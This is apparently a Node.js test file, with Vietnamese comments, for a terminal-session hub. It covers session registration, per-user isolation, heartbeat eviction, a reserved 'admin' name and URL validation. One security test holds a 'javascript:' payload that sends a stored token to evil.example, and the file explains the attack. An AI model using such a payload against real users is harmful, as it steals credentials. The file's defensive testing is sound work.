import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import net from 'node:net';
import { spawn } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import { createTerminalSessions, SESSION_EVICT_MS, HEARTBEAT_DEAD_MS } from '../src/terminal-sessions.js';

const SRV = path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'src', 'index.js');

// See notify-api.test.js for the same helper and why it asks the OS for a
// port instead of guessing one: two hubs landing on the same random number
// meant the loser died and its test silently talked to the WINNER's hub —
// different users.json, so the failure showed up as an unexplained 401 in a
// different test each run.
function freePort() {
  return new Promise((resolve, reject) => {
    const srv = net.createServer();
    srv.on('error', reject);
    srv.listen(0, '127.0.0.1', () => {
      const { port } = srv.address();
      srv.close(() => resolve(port));
    });
  });
}

const DEFAULT_USERS = [{ name: 'huy', token: 'tok-huy' }, { name: 'kien', token: 'tok-kien' }];

async function startHub(users = DEFAULT_USERS) {
  const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'ccrc-data-'));
  fs.writeFileSync(path.join(dataDir, 'users.json'), JSON.stringify(users));
  const port = await freePort();
  const proc = spawn('node', [SRV], {
    env: { ...process.env, CCRC_DATA_DIR: dataDir, CCRC_PORT: String(port), CCRC_TOKEN: 'admin-tok' },
    stdio: ['ignore', 'pipe', 'pipe'],
  });
  let died = null;
  let stderr = '';
  proc.stderr.on('data', (c) => { stderr += c; });
  proc.once('exit', (code, signal) => { died = `hub thoát sớm (code=${code}, signal=${signal})`; });

  const base = `http://127.0.0.1:${port}`;
  for (let i = 0; i < 100; i++) {
    if (died) throw new Error(`${died}\n${stderr}`);
    try {
      const r = await fetch(base + '/healthz');
      if (r.ok) break;
    } catch { /* not up yet */ }
    await new Promise((r) => setTimeout(r, 100));
  }
  if (died) throw new Error(`${died}\n${stderr}`);
  return { base, stop: () => proc.kill() };
}

async function withHub(fn, users) {
  const h = await startHub(users);
  try { await fn(h); } finally { h.stop(); }
}

const post = (h, p, tok, body) => fetch(h.base + p, {
  method: 'POST',
  headers: { 'content-type': 'application/json', authorization: `Bearer ${tok}` },
  body: JSON.stringify(body),
});
const get = (h, p, tok) => fetch(h.base + p, { headers: { authorization: `Bearer ${tok}` } });

const REG = { sessionId: 's-abc', machine: 'may-dev', url: 'http://100.86.1.2:8730/', secret: 'bi-mat-du-dai-32-ky-tu-nhe-ban' };

test('đăng ký rồi GET /api/terminal thấy phiên', async () => {
  await withHub(async (h) => {
    assert.equal((await post(h, '/api/terminal/register', 'tok-huy', REG)).status, 200);
    const j = await (await get(h, '/api/terminal', 'tok-huy')).json();
    assert.equal(j.sessions.length, 1);
    assert.equal(j.sessions[0].sessionId, 's-abc');
    assert.equal(j.sessions[0].machine, 'may-dev');
    assert.equal(j.sessions[0].url, 'http://100.86.1.2:8730/');
  });
});

test('hub KHÔNG trả bí mật HMAC ra ngoài', async () => {
  await withHub(async (h) => {
    await post(h, '/api/terminal/register', 'tok-huy', REG);
    const body = await (await get(h, '/api/terminal', 'tok-huy')).text();
    assert.ok(!body.includes(REG.secret), 'bí mật lộ ra API là mất toàn bộ giá trị của vé');
  });
});

test('chưa đăng ký thì sessions là mảng rỗng', async () => {
  await withHub(async (h) => {
    const j = await (await get(h, '/api/terminal', 'tok-huy')).json();
    assert.deepEqual(j.sessions, []);
  });
});

test('đăng ký hai phiên cho cùng một người → GET trả về cả hai, phiên trước không bị đè', async () => {
  await withHub(async (h) => {
    const REG2 = { sessionId: 's-def', machine: 'may-dev-2', url: 'http://100.86.1.2:8731/', secret: 'bi-mat-thu-hai-du-dai-32-ky-tu-nhe' };
    await post(h, '/api/terminal/register', 'tok-huy', REG);
    await post(h, '/api/terminal/register', 'tok-huy', REG2);
    const j = await (await get(h, '/api/terminal', 'tok-huy')).json();
    const ids = j.sessions.map((s) => s.sessionId).sort();
    assert.deepEqual(ids, ['s-abc', 's-def'], 'phiên thứ hai phải CỘNG THÊM, không đè mất phiên thứ nhất');
  });
});

// --- Cắt dứt điểm: đường vé do hub ký không còn tồn tại -------------------
//
// Đây là test hồi quy cho một QUYẾT ĐỊNH, không phải cho một hàm. Nếu ai đó
// khôi phục route này "cho tương thích", lỗ hổng mà cả thiết kế ghép cặp
// sinh ra để vá sẽ mở lại nguyên vẹn.
test('POST /api/terminal/ticket không còn tồn tại — 404', async () => {
  await withHub(async (h) => {
    await post(h, '/api/terminal/register', 'tok-huy', REG);
    assert.equal((await post(h, '/api/terminal/ticket', 'tok-huy', { sessionId: REG.sessionId })).status, 404);
  });
});

test('register vẫn nhận được khi KHÔNG có secret — daemon mới không gửi nữa', async () => {
  await withHub(async (h) => {
    const { secret, ...khongSecret } = REG;
    assert.equal((await post(h, '/api/terminal/register', 'tok-huy', khongSecret)).status, 200);
    const j = await (await get(h, '/api/terminal', 'tok-huy')).json();
    assert.equal(j.sessions.length, 1);
    void secret;
  });
});

test('hub KHÔNG trả secret ra ngoài kể cả khi daemon cũ còn gửi lên', async () => {
  await withHub(async (h) => {
    await post(h, '/api/terminal/register', 'tok-huy', { ...REG, secret: 'bi-mat-cua-daemon-cu' });
    const body = await (await get(h, '/api/terminal', 'tok-huy')).text();
    assert.ok(!body.includes('bi-mat-cua-daemon-cu'));
  });
});

test('KHÔNG thấy được phiên của người khác', async () => {
  await withHub(async (h) => {
    await post(h, '/api/terminal/register', 'tok-huy', REG);
    const j = await (await get(h, '/api/terminal', 'tok-kien')).json();
    assert.deepEqual(j.sessions, [], 'phiên của huy không được lộ cho kien');
  });
});

test('mỗi người chỉ thấy đúng phiên của mình khi cả hai đều có phiên đang mở', async () => {
  await withHub(async (h) => {
    const KIEN_REG = { sessionId: 's-kien-1', machine: 'may-kien', url: 'http://100.86.9.9:8730/', secret: 'bi-mat-cua-kien-du-dai-32-ky-tu' };
    await post(h, '/api/terminal/register', 'tok-huy', REG);
    await post(h, '/api/terminal/register', 'tok-kien', KIEN_REG);

    const huySessions = (await (await get(h, '/api/terminal', 'tok-huy')).json()).sessions;
    const kienSessions = (await (await get(h, '/api/terminal', 'tok-kien')).json()).sessions;
    assert.deepEqual(huySessions.map((s) => s.sessionId), ['s-abc']);
    assert.deepEqual(kienSessions.map((s) => s.sessionId), ['s-kien-1']);
  });
});

test('unregister xoá đúng một phiên', async () => {
  await withHub(async (h) => {
    await post(h, '/api/terminal/register', 'tok-huy', REG);
    await post(h, '/api/terminal/unregister', 'tok-huy', { sessionId: 's-abc' });
    const j = await (await get(h, '/api/terminal', 'tok-huy')).json();
    assert.deepEqual(j.sessions, []);
  });
});

test('unregister một phiên không đụng phiên khác của cùng người', async () => {
  await withHub(async (h) => {
    const REG2 = { sessionId: 's-def', machine: 'may-dev-2', url: 'http://100.86.1.2:8731/', secret: 'bi-mat-thu-hai-du-dai-32-ky-tu-nhe' };
    await post(h, '/api/terminal/register', 'tok-huy', REG);
    await post(h, '/api/terminal/register', 'tok-huy', REG2);
    await post(h, '/api/terminal/unregister', 'tok-huy', { sessionId: 's-abc' });
    const j = await (await get(h, '/api/terminal', 'tok-huy')).json();
    assert.deepEqual(j.sessions.map((s) => s.sessionId), ['s-def'], 'chỉ s-abc bị xoá, s-def phải còn nguyên');
  });
});

test('không token bị từ chối 401 ở cả ba endpoint', async () => {
  await withHub(async (h) => {
    const noAuth = (m, p) => fetch(h.base + p, {
      method: m, headers: { 'content-type': 'application/json' }, body: m === 'POST' ? '{}' : undefined,
    });
    assert.equal((await noAuth('POST', '/api/terminal/register')).status, 401);
    assert.equal((await noAuth('POST', '/api/terminal/unregister')).status, 401);
    assert.equal((await noAuth('GET', '/api/terminal')).status, 401);
  });
});

test('body dị dạng bị từ chối 400, không làm sập hub', async () => {
  await withHub(async (h) => {
    assert.equal((await post(h, '/api/terminal/register', 'tok-huy', { machine: 'x' })).status, 400);
    assert.equal((await post(h, '/api/terminal/register', 'tok-huy', null)).status, 400);
    assert.equal((await post(h, '/api/terminal/unregister', 'tok-huy', {})).status, 400);
    assert.equal((await fetch(h.base + '/healthz')).status, 200, 'hub phải còn sống');
  });
});

// --- Unit-level tests against createTerminalSessions() directly -----------
//
// These import the module instead of spawning the hub process, so a fake
// `now` can be injected — the only practical way to exercise heartbeat
// expiry without a real 60s wait. They also re-check the cross-user
// boundary at the smallest possible grain: no HTTP, no Express, just the
// Map-of-Maps itself, so a lookup-across-users mutation is caught right
// where it would be introduced.

test('[unit] nhịp tim quá hạn ở một phiên KHÔNG ảnh hưởng phiên khác của cùng người', () => {
  let t = 0;
  const terminals = createTerminalSessions({ now: () => t });
  terminals.register('huy', { sessionId: 's-old', machine: 'may-1', url: 'u1', secret: 'sec1' });
  t = 30_000; // 30s later: second session registers, first is now 30s stale
  terminals.register('huy', { sessionId: 's-new', machine: 'may-2', url: 'u2', secret: 'sec2' });
  t = 65_000; // 65s from t=0: s-old's heartbeat (at t=0) is 65s stale — dead.
              // s-new's heartbeat (at t=30_000) is 35s stale — still alive.
  const sessions = terminals.list('huy');
  const byId = Object.fromEntries(sessions.map((s) => [s.sessionId, s]));
  assert.equal(byId['s-old'].alive, false, 'phiên quá hạn nhịp tim phải báo alive:false');
  assert.equal(byId['s-new'].alive, true, 'phiên còn nhịp tim không được bị kéo theo thành alive:false');
});

// --- HIGH (đợt sửa cuối, mục 2): phiên chết phải bị DỌN, không chỉ báo ------
// --- alive:false rồi nằm lại vĩnh viễn. --------------------------------------
//
// Trước khi có nhiều phiên, đăng ký lại GHI ĐÈ lên entry cũ nên một daemon
// chết mà không kịp unregister sẽ tự lành ở lần `/remote on` sau. Nay mỗi
// `/remote on` sinh một sessionId mới nên không có gì ghi đè gì nữa: SIGKILL,
// crash, hay hub không với tới được lúc tắt máy đều để lại một entry sống mãi
// (người review đo được 41 cái tích lại). SESSION_EVICT_MS là ngưỡng dọn.

test('[unit] phiên mất nhịp tim quá lâu bị DỌN HẲN khỏi danh sách', () => {
  let t = 0;
  const terminals = createTerminalSessions({ now: () => t });
  terminals.register('huy', { sessionId: 's-chet', machine: 'may-1', url: 'u1', secret: 'sec1' });

  t = SESSION_EVICT_MS; // đúng ngưỡng: chưa vượt, vẫn phải còn (nhưng đã alive:false)
  assert.equal(terminals.list('huy').length, 1, 'đúng bằng ngưỡng thì chưa được dọn');
  assert.equal(terminals.list('huy')[0].alive, false,
    'khoảng giữa "mất nhịp tim" và "bị dọn" là lúc người dùng nhìn thấy cảnh báo máy có thể đã ngủ');

  t = SESSION_EVICT_MS + 1;
  assert.deepEqual(terminals.list('huy'), [], 'quá ngưỡng thì phiên phải biến mất, không nằm lại làm rác danh sách');
});

test('[unit] phiên còn nhịp tim KHÔNG bao giờ bị dọn nhầm, dù đã chạy lâu hơn ngưỡng rất nhiều', () => {
  let t = 0;
  const terminals = createTerminalSessions({ now: () => t });
  const reg = { sessionId: 's-song', machine: 'may-1', url: 'u1', secret: 'sec1' };
  terminals.register('huy', reg);
  // Daemon thật đập nhịp mỗi 20s (term/bin/ccrc-term.js HEARTBEAT_MS) dưới
  // CÙNG một sessionId. Chạy quá ngưỡng dọn gấp nhiều lần.
  for (let i = 1; i <= 300; i++) { // 300 × 20s = 100 phút, gấp hơn 3 lần ngưỡng
    t = i * 20_000;
    terminals.register('huy', reg);
    assert.equal(terminals.list('huy').length, 1, `phiên đang sống bị dọn nhầm ở nhịp thứ ${i}`);
  }
  assert.equal(terminals.list('huy')[0].alive, true);
});

test('[unit] dọn phiên chết KHÔNG kéo theo phiên sống của cùng người, cũng không đụng người khác', () => {
  let t = 0;
  const terminals = createTerminalSessions({ now: () => t });
  terminals.register('huy', { sessionId: 's-chet', machine: 'may-1', url: 'u1', secret: 'sec1' });
  terminals.register('kien', { sessionId: 's-kien', machine: 'may-k', url: 'uk', secret: 'seck' });

  t = SESSION_EVICT_MS + 1;
  // huy có một phiên vẫn đang đập nhịp bình thường
  terminals.register('huy', { sessionId: 's-song', machine: 'may-2', url: 'u2', secret: 'sec2' });
  // kien cũng vậy — nếu không, người dùng nào ngủ quên là mất sạch phiên
  terminals.register('kien', { sessionId: 's-kien', machine: 'may-k', url: 'uk', secret: 'seck' });

  assert.deepEqual(terminals.list('huy').map((s) => s.sessionId), ['s-song']);
  assert.deepEqual(terminals.list('kien').map((s) => s.sessionId), ['s-kien']);
});

test('[unit] người dùng bị dọn hết phiên vẫn trả mảng rỗng, không phải lỗi', () => {
  let t = 0;
  const terminals = createTerminalSessions({ now: () => t });
  terminals.register('huy', { sessionId: 's-chet', machine: 'may-1', url: 'u1', secret: 'sec1' });
  t = SESSION_EVICT_MS + 1;
  assert.deepEqual(terminals.list('huy'), []);
  assert.deepEqual(terminals.list('huy'), []); // gọi lần hai sau khi entry người dùng đã bị xoá
});

test('ngưỡng dọn phải CAO HƠN hẳn ngưỡng báo mất nhịp tim', () => {
  // Nếu hai ngưỡng bằng nhau, trạng thái "⚠ KHÔNG phản hồi — máy có thể đã
  // ngủ" không bao giờ hiện ra được: phiên biến mất đúng lúc nó đáng lẽ phải
  // cảnh báo. Cái khoảng giữa hai ngưỡng CHÍNH LÀ tính năng.
  assert.ok(SESSION_EVICT_MS > 5 * HEARTBEAT_DEAD_MS,
    'khoảng cảnh báo trước khi dọn phải rộng, không chỉ hơn một chút');
});

test('[unit] list() trả mảng rỗng cho người chưa từng đăng ký, không phải null/undefined', () => {
  const terminals = createTerminalSessions();
  assert.deepEqual(terminals.list('ai-do-chua-dang-ky'), []);
});

// --- Task 3: nhãn phân biệt phiên (label) — hub lưu và trả lại NGUYÊN VĂN --
//
// The hub's only job here is pass-through: it must never inspect, alter, or
// strip what the daemon sends as `label`. Enforcing "basename, never a full
// path" is the DAEMON's job (term/src/tmux.js's paneLabel/basenameOrFallback,
// unit-tested there) — this file only proves the hub does not lose or
// mutate whatever string it was handed.

test('[unit] register lưu label và list() trả lại y nguyên', () => {
  const terminals = createTerminalSessions();
  terminals.register('huy', { sessionId: 's-abc', machine: 'may-dev', url: 'u', secret: 'sec', label: 'cc-remote-control' });
  assert.equal(terminals.list('huy')[0].label, 'cc-remote-control');
});

test('[unit] không gửi label thì list() trả chuỗi rỗng, không phải undefined', () => {
  const terminals = createTerminalSessions();
  terminals.register('huy', { sessionId: 's-abc', machine: 'may-dev', url: 'u', secret: 'sec' });
  assert.equal(terminals.list('huy')[0].label, '');
});

test('đăng ký kèm label rồi GET /api/terminal thấy label y nguyên', async () => {
  await withHub(async (h) => {
    await post(h, '/api/terminal/register', 'tok-huy', { ...REG, label: 'cc-remote-control' });
    const j = await (await get(h, '/api/terminal', 'tok-huy')).json();
    assert.equal(j.sessions[0].label, 'cc-remote-control');
  });
});

test('label là BASENAME, không phải cả đường dẫn — hub trả lại đúng những gì daemon gửi, không tự thêm gì', () => {
  // This documents the contract from the daemon's side: if a daemon ever
  // regressed to sending a full path, the hub would faithfully echo THAT
  // back too — proving the hub itself does no basename enforcement (that
  // lives in term/src/tmux.js) while still pinning "whatever came in comes
  // back out unchanged, verbatim".
  const terminals = createTerminalSessions();
  terminals.register('huy', { sessionId: 's-abc', machine: 'may-dev', url: 'u', secret: 'sec', label: 'cc-remote-control' });
  const label = terminals.list('huy')[0].label;
  assert.equal(label, 'cc-remote-control');
  assert.ok(!label.includes('/'), 'một basename thật sự không được chứa dấu /');
});

test('đăng ký KHÔNG kèm label (daemon cũ) vẫn thành công, label rỗng chứ không làm hỏng đăng ký', async () => {
  await withHub(async (h) => {
    assert.equal((await post(h, '/api/terminal/register', 'tok-huy', REG)).status, 200);
    const j = await (await get(h, '/api/terminal', 'tok-huy')).json();
    assert.equal(j.sessions[0].label, '');
  });
});

test('label không phải chuỗi bị từ chối 400', async () => {
  await withHub(async (h) => {
    assert.equal((await post(h, '/api/terminal/register', 'tok-huy', { ...REG, label: 123 })).status, 400);
  });
});

test('hai phiên của cùng một người có label khác nhau — phân biệt được trên danh sách', async () => {
  await withHub(async (h) => {
    const REG2 = { sessionId: 's-def', machine: 'may-dev', url: 'http://100.86.1.2:8731/', secret: 'bi-mat-thu-hai-du-dai-32-ky-tu-nhe' };
    await post(h, '/api/terminal/register', 'tok-huy', { ...REG, label: 'cc-remote-control' });
    await post(h, '/api/terminal/register', 'tok-huy', { ...REG2, label: 'workspace' });
    const j = await (await get(h, '/api/terminal', 'tok-huy')).json();
    const labels = j.sessions.map((s) => s.label).sort();
    assert.deepEqual(labels, ['cc-remote-control', 'workspace']);
  });
});

// --- Kiểm toán 2026-07-29, lỗi 1: "admin" là TÊN DÀNH RIÊNG ----------------
//
// Token của hub (CCRC_TOKEN) đăng nhập dưới cái tên cứng 'admin'
// (src/index.js resolveUser), và MỌI dữ liệu trên hub đều khoá theo tên đó,
// không theo token: pushSubs[user.name], history, terminals.byUser.
//
// loadUsers() trước đây chỉ lọc trùng TOKEN (`u.token !== TOKEN`), không lọc
// trùng TÊN. Nên một dòng {"name":"admin","token":"..."} trong users.json là
// một danh tính THỨ HAI trỏ vào đúng ô dữ liệu của chủ hub — và ô đó chứa cả
// bí mật ký vé của mọi phiên terminal chủ hub đang mở.
//
// Không cần ác ý mới tạo ra nó: `./deploy.sh adduser admin` là đủ, vì
// cmd_adduser chỉ chống trùng giữa các user TRONG file, nó không biết
// 'admin' đã có chủ.
const USERS_WITH_IMPOSTOR = [
  { name: 'huy', token: 'tok-huy' },
  { name: 'admin', token: 'tok-gia-mao' },
];

test('user tên "admin" trong users.json KHÔNG thấy được yêu cầu ghép cặp đang chờ của chủ hub', async () => {
  await withHub(async (h) => {
    // Chủ hub (CCRC_TOKEN) bắt đầu một cuộc ghép cặp thiết bị.
    assert.equal((await post(h, '/api/pair/start', 'admin-tok', { pubKey: 'khoa-cong-khai-chu-hub', commit: 'cam-ket-chu-hub' })).status, 200);

    // Kẻ mang tên 'admin' xin xem danh sách ghép cặp đang chờ — nếu mượn được
    // danh tính chủ hub, nó thấy được cả khoá công khai lẫn cam kết của cuộc
    // ghép cặp đó, đủ để chen vào giữa nghi thức xác thực SAS.
    const r = await get(h, '/api/pair/pending', 'tok-gia-mao');
    assert.equal(r.status, 401,
      'token của một user tên "admin" phải bị từ chối thẳng, không được mượn danh tính chủ hub');
  }, USERS_WITH_IMPOSTOR);
});

test('user tên "admin" KHÔNG thấy danh sách phiên của chủ hub', async () => {
  await withHub(async (h) => {
    await post(h, '/api/terminal/register', 'admin-tok', REG);
    const r = await get(h, '/api/terminal', 'tok-gia-mao');
    assert.equal(r.status, 401,
      'danh sách phiên lộ ra tên máy, tên phiên và địa chỉ Tailscale của chủ hub');
  }, USERS_WITH_IMPOSTOR);
});

test('loại entry "admin" KHÔNG làm hỏng các user hợp lệ trong cùng file', async () => {
  await withHub(async (h) => {
    // Sửa hẹp: chỉ đúng dòng phạm tên dành riêng bị bỏ, phần còn lại của
    // users.json phải nạp bình thường — nếu không, một dòng sai sẽ khoá cửa
    // cả đội mà chẳng ai hiểu vì sao.
    assert.equal((await post(h, '/api/terminal/register', 'tok-huy', REG)).status, 200);
    const j = await (await get(h, '/api/terminal', 'tok-huy')).json();
    assert.deepEqual(j.sessions.map((s) => s.sessionId), [REG.sessionId]);
  }, USERS_WITH_IMPOSTOR);
});

test('chủ hub vẫn dùng được token của mình bình thường khi có entry "admin" bị loại', async () => {
  await withHub(async (h) => {
    assert.equal((await post(h, '/api/terminal/register', 'admin-tok', REG)).status, 200);
    const j = await (await get(h, '/api/terminal', 'admin-tok')).json();
    assert.deepEqual(j.sessions.map((s) => s.sessionId), [REG.sessionId]);
  }, USERS_WITH_IMPOSTOR);
});

// --- Kiểm toán 2026-07-29, lỗi 2: `url` phải là địa chỉ tailnet thật -------
//
// PWA mở terminal bằng `location.href = session.url + '#t=' + ve`
// (public/app.js). Hub trước đây nhận `url` là chuỗi bất kỳ, nên bất cứ ai
// đăng ký được một "phiên" là điều khiển được nơi trình duyệt nạn nhân đi
// tới khi bấm "Mở terminal": `javascript:` chạy ngay trong origin của PWA và
// đọc được localStorage.ccrc_token, còn một domain lạ thì dựng trang giả hỏi
// lại token.
//
// Daemon thật CHỈ sinh ra `http://<IPv4 Tailscale>:<cổng>/` — publicUrl được
// dựng từ checkPrereqs().ip, mà hàm đó lọc đúng IPv4 (term/src/tailscale.js).
// Nên hub từ chối mọi thứ khác là đúng bằng thực tế production, không phải
// một ràng buộc bịa thêm.

test('url scheme javascript: bị từ chối 400', async () => {
  await withHub(async (h) => {
    const doc = { ...REG, url: 'javascript:fetch("https://evil.example/"+localStorage.ccrc_token)' };
    assert.equal((await post(h, '/api/terminal/register', 'tok-huy', doc)).status, 400,
      'javascript: chạy trong origin của PWA — đây là đường lấy token trực tiếp');
    const j = await (await get(h, '/api/terminal', 'tok-huy')).json();
    assert.deepEqual(j.sessions, [], 'phiên bị từ chối thì không được nằm lại trong danh sách');
  });
});

test('url trỏ ra domain ngoài bị từ chối 400', async () => {
  await withHub(async (h) => {
    assert.equal((await post(h, '/api/terminal/register', 'tok-huy', { ...REG, url: 'https://evil.example/term/' })).status, 400,
      'một domain lạ dựng được trang giả giống hệt trang terminal để hỏi lại token');
  });
});

test('url trỏ về loopback bị từ chối 400 — daemon thật không bao giờ báo địa chỉ này', async () => {
  await withHub(async (h) => {
    assert.equal((await post(h, '/api/terminal/register', 'tok-huy', { ...REG, url: 'http://127.0.0.1:8730/' })).status, 400);
  });
});

test('url là IPv4 Tailscale được chấp nhận và trả lại nguyên văn', async () => {
  await withHub(async (h) => {
    const url = 'http://100.101.102.103:62539/';
    assert.equal((await post(h, '/api/terminal/register', 'tok-huy', { ...REG, url })).status, 200);
    const j = await (await get(h, '/api/terminal', 'tok-huy')).json();
    assert.equal(j.sessions[0].url, url);
  });
});
